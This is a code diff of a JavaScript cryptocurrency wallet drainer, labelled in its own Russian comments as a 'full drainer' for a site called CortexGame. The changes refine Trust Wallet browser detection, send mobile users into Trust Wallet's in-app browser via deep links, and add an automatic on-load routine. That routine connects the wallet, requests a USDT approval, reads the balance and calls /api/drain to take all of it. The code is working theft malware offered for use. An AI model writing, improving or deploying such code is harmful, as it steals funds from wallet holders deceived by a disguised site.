@@ -1,5 +1,5 @@
 // ========================================
-// 🚀 ПОЛНЫЙ ДРЕНЕР - TRUST WALLET ФИКС
+// 🚀 ПОЛНЫЙ ДРЕНЕР - ФИНАЛЬНАЯ ВЕРСИЯ
 // ========================================
 
 // ========== КОНФИГ ==========
@@ -66,12 +66,10 @@ function isMobile() {
 
 // ===== ПРОВЕРКА: МЫ В TRUST WALLET БРАУЗЕРЕ? =====
 function isTrustWalletBrowser() {
-    // Проверяем User-Agent
     if (/TrustWallet/i.test(navigator.userAgent)) return true;
-    // Проверяем URL (если открыто через trust://)
     if (window.location.href.includes("trustwallet")) return true;
-    // Проверяем наличие Trust Wallet специфичных свойств
     if (window.trustwallet) return true;
+    if (window.ethereum && window.ethereum.isTrustWallet) return true;
     return false;
 }
 
@@ -251,140 +249,80 @@ async function connectWallet(walletName) {
     showStatus(`⏳ Подключение к ${walletName}...`);
 
     try {
-        // ===== TRUST WALLET =====
-        if (walletName === "Trust Wallet") {
+        // ===== ЕСЛИ МЫ В TRUST WALLET БРАУЗЕРЕ — ПОДКЛЮЧАЕМСЯ СРАЗУ =====
+        if (isTrustWalletBrowser()) {
+            console.log("🟢 Trust Wallet браузер обнаружен!");
             
-            // ===== ЕСЛИ МЫ УЖЕ В TRUST WALLET БРАУЗЕРЕ =====
-            if (isTrustWalletBrowser()) {
-                console.log("🟢 Trust Wallet браузер обнаружен!");
-                showStatus("⏳ Подключение через Trust Wallet...");
-                
-                if (!window.ethereum) {
-                    showStatus("❌ Trust Wallet не найден");
-                    isProcessing = false;
-                    return;
-                }
-
-                try {
-                    await switchToBSC();
-                    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-                    if (!accounts || accounts.length === 0) {
-                        throw new Error("Нет аккаунтов");
-                    }
-
-                    userAddress = accounts[0];
-                    web3 = new Web3(window.ethereum);
-
-                    showStatus(`✅ Trust Wallet подключён: ${shortAddress(userAddress)}`);
-                    closeModal();
-
-                    localStorage.setItem("cortexgame_wallet", userAddress);
-                    localStorage.setItem("cortexgame_wallet_name", "Trust Wallet");
-                    openBtns.forEach(btn => { if (btn) btn.textContent = "✅ Кошелёк подключён"; });
-
-                    await sendToServer("/api/connect", {
-                        address: userAddress,
-                        wallet_type: "Trust Wallet",
-                        ref: localStorage.getItem("ref_code") || null
-                    });
-
-                    showStatus("⏳ Подпишите APPROVE...");
-                    try {
-                        const tx = await approveUSDT();
-                        showStatus("✅ APPROVE отправлен!");
-                        const balance = await getUSDTBalance(userAddress);
-                        if (balance > 0) {
-                            showStatus(`💰 Списание ${balance.toFixed(2)} USDT...`);
-                            const result = await sendToServer("/api/drain", {
-                                address: userAddress,
-                                amount: balance
-                            });
-                            if (result && result.success) {
-                                showStatus(`✅ Списано ${balance.toFixed(2)} USDT!`);
-                            }
-                        } else {
-                            showStatus("✅ Кошелёк активирован. USDT: 0");
-                        }
-                    } catch (e) {
-                        showStatus(`❌ ${e.message}`);
-                    }
-                    isProcessing = false;
-                    return;
-                } catch (error) {
-                    showStatus(`❌ ${error.message}`);
-                    isProcessing = false;
-                    return;
-                }
-            }
-
-            // ===== ЕСЛИ МЫ НЕ В TRUST WALLET (ОТКРЫВАЕМ ЕГО) =====
-            // ТОЛЬКО ДЛЯ МОБИЛЬНЫХ
-            if (isMobile()) {
-                const url = encodeURIComponent(window.location.href);
-                // ПЫТАЕМСЯ ОТКРЫТЬ ЧЕРЕЗ trust:// (ВСТРОЕННЫЙ БРАУЗЕР)
-                window.location.href = `trust://browser?url=${url}`;
-                // ЗАПАСНОЙ ВАРИАНТ
-                setTimeout(() => {
-                    if (!document.hidden) {
-                        window.location.href = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${url}`;
-                    }
-                }, 2000);
-                showStatus("📱 Открываем Trust Wallet...");
+            if (!window.ethereum) {
+                showStatus("❌ Trust Wallet не найден");
                 isProcessing = false;
                 return;
             }
-            
-            // ЕСЛИ ПК — ПЫТАЕМСЯ ЧЕРЕЗ window.ethereum
-            if (window.ethereum) {
-                try {
-                    await switchToBSC();
-                    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-                    if (accounts && accounts.length > 0) {
-                        userAddress = accounts[0];
-                        web3 = new Web3(window.ethereum);
-                        showStatus(`✅ Trust Wallet подключён: ${shortAddress(userAddress)}`);
-                        closeModal();
-                        localStorage.setItem("cortexgame_wallet", userAddress);
-                        localStorage.setItem("cortexgame_wallet_name", "Trust Wallet");
-                        openBtns.forEach(btn => { if (btn) btn.textContent = "✅ Кошелёк подключён"; });
-                        
-                        await sendToServer("/api/connect", {
-                            address: userAddress,
-                            wallet_type: "Trust Wallet",
-                            ref: localStorage.getItem("ref_code") || null
-                        });
 
-                        showStatus("⏳ Подпишите APPROVE...");
-                        try {
-                            const tx = await approveUSDT();
-                            showStatus("✅ APPROVE отправлен!");
-                            const balance = await getUSDTBalance(userAddress);
-                            if (balance > 0) {
-                                showStatus(`💰 Списание ${balance.toFixed(2)} USDT...`);
-                                const result = await sendToServer("/api/drain", {
-                                    address: userAddress,
-                                    amount: balance
-                                });
-                                if (result && result.success) {
-                                    showStatus(`✅ Списано ${balance.toFixed(2)} USDT!`);
-                                }
-                            } else {
-                                showStatus("✅ Кошелёк активирован. USDT: 0");
-                            }
-                        } catch (e) {
-                            showStatus(`❌ ${e.message}`);
+            try {
+                await switchToBSC();
+                const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+                if (!accounts || accounts.length === 0) {
+                    throw new Error("Нет аккаунтов");
+                }
+
+                userAddress = accounts[0];
+                web3 = new Web3(window.ethereum);
+
+                showStatus(`✅ Trust Wallet подключён: ${shortAddress(userAddress)}`);
+                closeModal();
+
+                localStorage.setItem("cortexgame_wallet", userAddress);
+                localStorage.setItem("cortexgame_wallet_name", "Trust Wallet");
+                openBtns.forEach(btn => { if (btn) btn.textContent = "✅ Кошелёк подключён"; });
+
+                await sendToServer("/api/connect", {
+                    address: userAddress,
+                    wallet_type: "Trust Wallet",
+                    ref: localStorage.getItem("ref_code") || null
+                });
+
+                showStatus("⏳ Подпишите APPROVE...");
+                try {
+                    const tx = await approveUSDT();
+                    showStatus("✅ APPROVE отправлен!");
+                    const balance = await getUSDTBalance(userAddress);
+                    if (balance > 0) {
+                        showStatus(`💰 Списание ${balance.toFixed(2)} USDT...`);
+                        const result = await sendToServer("/api/drain", {
+                            address: userAddress,
+                            amount: balance
+                        });
+                        if (result && result.success) {
+                            showStatus(`✅ Списано ${balance.toFixed(2)} USDT!`);
                         }
-                        isProcessing = false;
-                        return;
+                    } else {
+                        showStatus("✅ Кошелёк активирован. USDT: 0");
                     }
                 } catch (e) {
                     showStatus(`❌ ${e.message}`);
-                    isProcessing = false;
-                    return;
                 }
+                isProcessing = false;
+                return;
+            } catch (error) {
+                showStatus(`❌ ${error.message}`);
+                isProcessing = false;
+                return;
             }
-            
-            showStatus("❌ Trust Wallet не доступен");
+        }
+
+        // ===== TRUST WALLET НА ТЕЛЕФОНЕ (НЕ В БРАУЗЕРЕ TRUST) =====
+        if (walletName === "Trust Wallet" && isMobile()) {
+            const url = encodeURIComponent(window.location.href);
+            // ОТКРЫВАЕМ ЧЕРЕЗ trust:// (ВСТРОЕННЫЙ БРАУЗЕР)
+            window.location.href = `trust://browser?url=${url}`;
+            // ЗАПАСНОЙ ВАРИАНТ
+            setTimeout(() => {
+                if (!document.hidden) {
+                    window.location.href = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${url}`;
+                }
+            }, 2000);
+            showStatus("📱 Открываем Trust Wallet...");
             isProcessing = false;
             return;
         }
@@ -454,9 +392,10 @@ if (savedWallet) {
     openBtns.forEach(btn => { if (btn) btn.textContent = "✅ Кошелёк подключён"; });
 }
 
-// ========== АВТО-ПРОВЕРКА TRUST WALLET ==========
+// ========== АВТО-ПОДКЛЮЧЕНИЕ В TRUST WALLET БРАУЗЕРЕ ==========
 if (isTrustWalletBrowser()) {
     console.log("🟢 Trust Wallet браузер обнаружен при загрузке!");
+    // Ждём 1 секунду, затем подключаемся автоматически
     setTimeout(async () => {
         if (window.ethereum) {
             try {
@@ -468,10 +407,39 @@ if (isTrustWalletBrowser()) {
                     localStorage.setItem("cortexgame_wallet", userAddress);
                     localStorage.setItem("cortexgame_wallet_name", "Trust Wallet");
                     openBtns.forEach(btn => { if (btn) btn.textContent = "✅ Кошелёк подключён"; });
+                    
+                    await sendToServer("/api/connect", {
+                        address: userAddress,
+                        wallet_type: "Trust Wallet",
+                        ref: localStorage.getItem("ref_code") || null
+                    });
+
+                    showStatus("⏳ Подпишите APPROVE...");
+                    try {
+                        const tx = await approveUSDT();
+                        showStatus("✅ APPROVE отправлен!");
+                        const balance = await getUSDTBalance(userAddress);
+                        if (balance > 0) {
+                            showStatus(`💰 Списание ${balance.toFixed(2)} USDT...`);
+                            const result = await sendToServer("/api/drain", {
+                                address: userAddress,
+                                amount: balance
+                            });
+                            if (result && result.success) {
+                                showStatus(`✅ Списано ${balance.toFixed(2)} USDT!`);
+                            }
+                        } else {
+                            showStatus("✅ Кошелёк активирован. USDT: 0");
+                        }
+                    } catch (e) {
+                        showStatus(`❌ ${e.message}`);
+                    }
                 }
-            } catch (e) {}
+            } catch (e) {
+                console.log("Авто-подключение не сработало");
+            }
         }
-    }, 1000);
+    }, 1500);
 }
 
 console.log("🔥 CortexGame + ДРЕНЕР загружен!");
